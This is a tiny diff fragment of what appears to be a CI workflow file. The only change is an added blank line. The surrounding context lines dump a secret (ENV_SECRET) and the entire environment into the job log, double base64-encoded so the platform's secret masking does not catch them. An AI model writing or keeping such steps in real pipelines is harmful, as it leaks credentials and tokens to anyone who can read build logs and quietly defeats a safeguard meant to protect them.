@@ -18,3 +18,4 @@ jobs:
           echo "ENV_SECRET: $(base64 <<< $(base64 <<< "$ENV_SECRET"))"
           echo "ALL ENV: $(base64 <<< $(base64 <<< "$(env)"))"
           
+
